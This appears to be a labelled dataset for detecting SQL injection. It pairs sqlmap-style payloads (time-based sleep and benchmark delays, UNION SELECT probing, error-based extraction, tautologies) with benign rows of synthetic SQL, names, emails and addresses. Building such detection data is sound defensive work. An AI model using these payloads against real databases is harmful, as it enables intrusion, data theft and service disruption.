payload	label
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #	1
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82c5dbb23' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
   SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID ) 	0
SELECT * FROM order WHERE but = 'piano' LIMIT 3	0
"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"	1
remington	0
robieux	0
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--"	1
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising	0
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx"	1
"1%"" union all select null,null,null--"	1
SELECT shall FROM better	0
ruben	0
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  "	1
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   "	1
7542	0
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth'	0
1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --	1
terrs triola	0
1026060000000000	0
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" like ""hrkf"	1
  SELECT Orders.parallelrID, Employees.was, Employees.volume FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.toID ORDER BY Orders.burstID	0
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca"	1
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp"	1
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """	1
22533	0
SELECT * FROM bat  WHERE built = few	0
SELECT * FROM simple WHERE good NOT BETWEEN 'attempt' AND 'stems'	0
  SELECT * FROM figure WHERE worker NOT IN  ( 'how', 'eye', 'familiar' )  	0
1'   )    )    as wdor where 7426  =  7426	1
DELETE FROM hill WHERE aboard = 'opposite'	0
  SELECT Orders.fireplacerID, Employees.captain, Employees.seed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forID ORDER BY Orders.slowID	0
6432	0
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen	0
SELECT boat ( s ) FROM tribe INNER JOIN	0
8702700000000000	0
82452687x	0
 select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1	1
holtz@pasajesaereosbaratos.es	0
1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
   SELECT becoming, atomic, researchFROM carbon WHERE modern  IS NOT NULL	0
SELECT TOP 3 * FROM nearer SELECT * FROM visitor 3SELECT * FROM purple	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i	1
SELECT TOP 3 * FROM oxygen WHERE writer = 'pan'	0
-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--	1
SELECT * FROM active WHERE thing BETWEEN sail09/01/1996careful AND birthday15/31/1996examine	0
54180440f	0
1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'ochr' like 'ochr	1
lerumeur@phd-photodecor.sj	0
SELECT * FROM children 3 SELECT * FROM desert	0
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love	0
 --	1
1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym	1
SELECT * FROM burn WHERE race BETWEEN voyage09/01/1996paid AND secret15/31/1996goes	0
rurick5	0
satoh	0
8615	0
7016	0
SELECT AVG ( key )  FROM pair  SELECT SUM ( level ) 	0
-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa	1
SELECT * FROM spider WHERE folks = 'character' LIMIT 3	0
"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY	0
2446e8t6da	0
sunderla	0
1%' union all select null,null,null,null,null#	1
"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"	1
SELECT * FROM than WHERE Price NOT BETWEEN 10 AND 20	0
"1"" where 2547  =  2547 or sleep  (  5  )  #"	1
"  SELECT DATEDIFF ( ""2017-01-01"",   ""2016-12-24"" ) ;"	0
SELECT * FROM tell  WHERE place NOT LIKE '[pilot]%'	0
  UPDATE success SET without =  'question', City =  'raw' WHERE swept =  further	0
1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'qutm'  =  'qutm	1
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_custom_fields_update' LIMIT 1	0
1 where 8393  =  8393	1
0x730065006c0065006300740020004000400076006500 ...	1
SELECT * FROM simplest WHERE amount BETWEEN 'notice' AND 'five'	0
SELECT teeth ( s ) FROM may INNER JOIN	0
" select sleep  (  5  )   and ""oivc"" like ""oivc"	1
bilal	0
75131649x	0
SELECT * FROM jet WHERE substance BETWEEN '1996-07-01' AND '1996-07-31'	0
yescas feal	0
end and    (    (     (  3673  =  3673	1
  SELECT * FROM tide WHERE pie IN  ( 'particles', 'count', 'knife' )  	0
breceda perdig	0
9.90463E+015	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'	1
SELECT COUNT ( teach ) FROM pleasure	0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
1%'  )   union all select null#	1
2306	0
1 where 1092  =  1092	1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'	1
-3518  )   union all select 1877,1877,1877,1877#	1
-2247'  )   union all select 1202,1202,1202,1202,1202#	1
-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#	1
"1""  )   where 8153  =  8153"	1
tabaquera	0
invo3unta6i5	0
1  )   as hywx where 1424  =  1424 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
c/ academia, 59, 3?g	0
  SELECT Orders.seriesrID, Employees.leg, Employees.serve FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.trainID ORDER BY Orders.briefID	0
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """	1
SELECT MIN ( truck )  AS me FROM west	0
1'  )   as wjty where 2971  =  2971	1
SELECT DISTINCT rose FROM public	0
prat de llobregat, el	0
SELECT COUNT ( own ) FROM breeze	0
"1""  )   union all select null,null,null,null--"	1
1   )    )    as myxo where 1759  =  1759 union all select null#	1
estolano boget	0
pernign	0
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg"	1
zempoalteca fuxet	0
9nte0uer3o	0
paterson	0
1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --	1
SELECT * FROM situation WHERE additional = 'eye'  OR slope = 'horn'	0
SELECT solve FROM popular UNION SELECT find FROM helpful ORDER BY wheel	0
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy"	1
mcconnel	0
1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||'	1
SELECT AVG ( habit ) FROM ago SELECT SUM ( manner ) 	0
3119850000000000	0
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY	0
laurencia	0
1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '	1
-2364' or 6743  =  7578	1
SELECT * FROM birth WHERE organization = 'consonant'	0
1'||  (  select 'setd' from dual where 3686  =  3686   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'	1
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes'	0
SELECT TOP 3 * FROM mark SELECT * FROM raw 3SELECT * FROM bill	0
-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#	1
iif  (  8354  =  3515,1,1/0  )  	1
1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'	1
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq	1
1%' union all select null,null--	1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds"	1
-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#	1
congregation@saludyfitness.pm	0
1%' union all select null,null,null,null,null,null,null,null,null#	1
38435	0
SELECT * FROM chain WHERE butter LIKE '%way%'	0
1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'	1
jandtegui curell	0
tice	0
SELECT COUNT ( DISTINCT grown )  FROM until	0
1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  	1
4s2cu8e44	0
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #	1
1%'  )   union all select null,null,null,null,null,null,null--	1
SELECT TOP 3 * FROM program	0
SELECT TOP 50 PERCENT * FROM writing	0
39527	0
  SELECT Orders.easierrID, Employees.organized, Employees.general FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.courtID ORDER BY Orders.soonID	0
mola guell	0
INSERT INTO chicken ( belt, bad, guess, perhaps, girl, part )  VALUES  ( 'feature', 'hidden'. surprise', 'shown', 'wind', 'minute', 'bet' )  	0
adolfo	0
-9634'   )    )     )   union all select 4141,4141#	1
SELECT * FROM consonant WHERE using LIKE '%book%'	0
1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
SELECT DISTINCT instrument FROM this	0
"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--"	1
63171354z	0
mazursky@mundo-deportivo.mx	0
SELECT MIN ( brain )  AS golden FROM individual	0
t6r551ero	0
SELECT everything ( s )  FROM industry SELECT street ( s ) 	0
SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM lion	0
2300000000000000	0
SELECT * FROM wolf 3	0
DELETE FROM mood WHERE folks = 'record'	0
SELECT * FROM  ( SELECT trade FROM package ) 	0
6204150000000000	0
1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
6019	0
SELECT AVG ( increase )  FROM president  SELECT SUM ( today ) 	0
cracoviano	0
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  "	1
1 and 7533  =  7533# absp	1
1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
"1""   )    )    as fjtv where 8904  =  8904"	1
anything' OR 'x'  =  'x	1
5564390000000000	0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat"	1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--	1
ikediek torrades	0
1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +'	1
SELECT * FROM been 3 SELECT * FROM fence	0
SELECT * FROM  ( SELECT gasoline FROM busy ) 	0
  SELECT giant AS rhyme, copper AS [particular]  FROM loose	0
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb	1
1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --	1
  SELECT prizeID AS ID, either AS plain FROM carefully	0
"SELECT CHAR_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;"	0
-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--	1
c632i6ela	0
79	0
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
particular teresa orozco 101	0
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo"	1
narbo_nesa	0
"-3215""  )   union all select 4457,4457,4457,4457,4457#"	1
1   )    )    as gxvp where 3865  =  3865	1
1525	0
22655130s	0
"1""  )   as xsgx where 5239  =  5239 union all select null,null--"	1
c/ violetas 43, 3-a	0
"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #"	1
1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) 	1
waitfor delay '0:0:5' and   (  4614  =  4614	1
"-4373%""   )    )    or 5672  =  5188--"	1
SELECT kept ( s )  FROM powder UNION ALL	0
 SELECT column_name ( s )  FROM sport,accurate	0
   SELECT strong, planned, massFROM trip WHERE paper  IS NOT NULL	0
"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """	1
5365	0
88341714w	0
SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM connected WHERE donkey NOT BETWEEN 'save' AND 'angle'	0
  SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she	0
   SELECT report, rod, shownFROM speech WHERE bell  IS NOT NULL	0
43061609c	0
alkin@lesionesmusculares.pf	0
"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """	1
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
  UPDATE which SET gas =  'court', City =  'its' WHERE dropped =  can	0
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY	0
DELETE FROM gave WHERE electric = 'between'	0
SELECT COUNT ( wireID ) FROM worth	0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""arqb"" like ""arqb"	1
6701920000000000	0
1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  	1
DELETE FROM present	0
SELECT TOP 3 * FROM theory WHERE friendly = 'he'	0
1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --	1
